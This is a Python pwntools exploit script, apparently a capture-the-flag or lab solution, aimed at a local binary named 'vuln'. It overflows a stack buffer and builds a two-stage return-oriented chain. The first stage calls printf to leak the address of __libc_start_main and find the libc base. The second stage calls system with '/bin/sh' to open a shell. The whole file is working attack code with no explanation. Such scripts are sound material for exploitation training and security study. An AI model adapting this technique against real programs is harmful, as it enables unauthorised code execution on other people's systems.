#!/usr/bin/python3
from pwn import *

p = process('./vuln')
elf = ELF('./vuln')
libc = ELF('/lib/x86_64-linux-gnu/libc-2.29.so')
gadgets = ROP(elf)

PRINTF = elf.plt['printf']
LIBC_START_MAIN = elf.symbols['__libc_start_main']
POP_RDI = (gadgets.find_gadget(['pop rdi', 'ret']))[0]
POP_RSI = (gadgets.find_gadget(['pop rsi', 'pop r15', 'ret']))[0]
FORMAT = next(elf.search(b"%s"))
DUMMY = 0xdeadbeefc0ded00d
MAIN = elf.symbols['main']

# print information
log.info("printf@plt                :" + hex(PRINTF))
log.info("symbols@__libc_start_main :" + hex(LIBC_START_MAIN))
log.info("Gadget pop rdi            :" + hex(POP_RDI))
log.info("Gadget pop rsi            :" + hex(POP_RSI))
log.info("Gadget format             :" + hex(FORMAT))
log.info("Dummy                     :" + hex(DUMMY))
log.info("main@plt                  :" + hex(MAIN))

payload = cyclic(40) + p64(POP_RDI) + p64(FORMAT) + p64(POP_RSI) + p64(LIBC_START_MAIN) + p64(DUMMY) + p64(PRINTF) + p64(MAIN)

log.info("Stage 1: Send payload to leak vaddr of __libc_start_main")
p.sendlineafter("buddy", payload)
p.recvline()
result = p.recvline()
stripped = (result.split(b' '))[0]
leak = u64(stripped.ljust(8, b'\x00'))

log.info("Vaddr __libc_start_main: " + hex(leak))

log.info("Stage two, prepare exploit")
libc.address = leak - libc.sym['__libc_start_main']
SYSTEM = libc.sym['system']
BIN_SH = next(libc.search(b'/bin/sh'))

log.info("libc sym@system : " + hex(SYSTEM))
log.info("libc /bin/sh    : " + hex(BIN_SH))

# Prepare second payload
payload = cyclic(40) + p64(POP_RDI) + p64(BIN_SH) + p64(SYSTEM)

log.info("Sending exploit, shell should open")
p.sendlineafter("buddy", payload)
p.interactive()






